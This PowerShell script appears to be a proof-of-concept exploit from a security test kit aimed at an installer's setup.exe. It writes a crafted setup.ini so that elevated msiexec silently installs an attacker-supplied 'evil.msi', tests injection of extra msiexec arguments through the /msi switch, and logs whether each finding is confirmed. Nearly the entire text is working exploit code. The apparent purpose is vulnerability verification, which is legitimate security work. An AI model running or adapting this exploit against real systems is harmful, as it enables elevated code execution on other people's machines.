param([string]$InstallerPath, [int]$TimeoutSeconds = 120)

. (Join-Path $PSScriptRoot 'common.ps1')

Write-Header 'ACRO-03 / ACRO-14 - setup.ini drives elevated msiexec (RCE) + ACRO-04 /msi injection'
Require-Admin
Ensure-Results

$setup = Join-Path $PayloadDir 'setup.exe'
if (-not (Test-Path -LiteralPath $setup)) {
    Write-Host 'setup.exe is not bundled; extracting it from the installer...' -ForegroundColor Yellow
    & (Join-Path $PSScriptRoot 'Extract-Payload.ps1') -InstallerPath $InstallerPath
    $cached = Join-Path $WorkDir 'payload-source.txt'
    if (Test-Path $cached) { $src = (Get-Content $cached -Raw).Trim(); $setup = Join-Path $src 'setup.exe' }
}
if (-not (Test-Path -LiteralPath $setup)) { throw 'setup.exe not found (run Extract-Payload.ps1 or pass the installer).' }
if (-not (Test-Path -LiteralPath $EvilMsi)) { throw "Missing payload\\evil.msi" }
Remove-Marker

$work = Join-Path $WorkDir 'acro03'
if (Test-Path -LiteralPath $work) { Remove-Item -Recurse -Force -LiteralPath $work -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Force -Path $work | Out-Null

$ini = Join-Path $work 'setup.ini'
@"
[Startup]
RequireOS=Windows 7
RequireOS64=Windows 10
RequireMSI=3.1

[Product]
PATCH=
msi=$EvilMsi
CmdLine=/qn
"@ | Set-Content -LiteralPath $ini -Encoding ASCII

$log = Join-Path $ResultsDir 'acro03-process.log'
Remove-Item -LiteralPath $log -ErrorAction SilentlyContinue
$proc = Start-Process -FilePath $setup -ArgumentList @('/ini', ('"' + $ini + '"')) -PassThru
$deadline = (Get-Date).AddSeconds($TimeoutSeconds)
$sawMsiexec = $false
$marker = $null
while ((Get-Date) -lt $deadline) {
    Get-CimInstance Win32_Process -Filter "Name='msiexec.exe'" -ErrorAction SilentlyContinue | ForEach-Object {
        $line = ('[{0}] msiexec PID {1} :: {2}' -f (Get-Date -Format o), $_.ProcessId, $_.CommandLine)
        Add-Content -LiteralPath $log -Value $line -ErrorAction SilentlyContinue
        Write-Host $line -ForegroundColor DarkYellow
        $sawMsiexec = $true
    }
    $marker = Test-Marker
    if ($marker) { break }
    if ($proc.HasExited) { break }
    Start-Sleep -Milliseconds 200
}
Start-Sleep -Seconds 1
if ($proc -and -not $proc.HasExited) { Stop-Tree $proc.Id }
Get-Process msiexec,setup -ErrorAction SilentlyContinue | ForEach-Object { Stop-Tree $_.Id }

if ($marker) {
    $mtxt = ($marker -replace '\s+', ' ').Trim()
    Emit-Result 'ACRO-03' 'CONFIRMED' ("elevated setup.exe installed attacker MSI; marker: $mtxt")
    Emit-Result 'ACRO-14' 'CONFIRMED' 'setup.exe accepted attacker /ini and executed attacker-controlled msi='
} elseif ($sawMsiexec) {
    Emit-Result 'ACRO-03' 'UNCONFIRMED' 'msiexec launched with attacker msi but marker not found (see acro03-process.log)'
} else {
    Emit-Result 'ACRO-03' 'UNCONFIRMED' 'msiexec not observed (setup.exe may have rejected INI/source hash)'
}

# ACRO-04 - /msi argument injection observation
$ini2 = Join-Path $work 'setup-inject.ini'
@"
[Startup]
RequireOS=Windows 7
RequireOS64=Windows 10
RequireMSI=3.1
[Product]
PATCH=
msi=$EvilMsi
CmdLine=/qn
"@ | Set-Content -LiteralPath $ini2 -Encoding ASCII

$log2 = Join-Path $ResultsDir 'acro04-process.log'
Remove-Item -LiteralPath $log2 -ErrorAction SilentlyContinue
$proc2 = Start-Process -FilePath $setup -ArgumentList @('/ini', ('"' + $ini2 + '"'), '/msi', '/qn', 'POCINJECT=1') -PassThru
$deadline = (Get-Date).AddSeconds(60)
$hit = $false
while ((Get-Date) -lt $deadline) {
    Get-CimInstance Win32_Process -Filter "Name='msiexec.exe'" -ErrorAction SilentlyContinue | ForEach-Object {
        $line = ('[{0}] msiexec PID {1} :: {2}' -f (Get-Date -Format o), $_.ProcessId, $_.CommandLine)
        Add-Content -LiteralPath $log2 -Value $line -ErrorAction SilentlyContinue
        Write-Host $line -ForegroundColor DarkYellow
        if ($_.CommandLine -and $_.CommandLine -match 'POCINJECT=1') { $hit = $true }
    }
    if ($hit -or $proc2.HasExited) { break }
    Start-Sleep -Milliseconds 200
}
if ($proc2 -and -not $proc2.HasExited) { Stop-Tree $proc2.Id }
Get-Process msiexec,setup -ErrorAction SilentlyContinue | ForEach-Object { Stop-Tree $_.Id }

if ($hit) {
    Emit-Result 'ACRO-04' 'CONFIRMED' 'msiexec command line contained injected /msi property POCINJECT=1'
} else {
    Emit-Result 'ACRO-04' 'UNCONFIRMED' 'injected /msi property not observed (see acro04-process.log)'
}
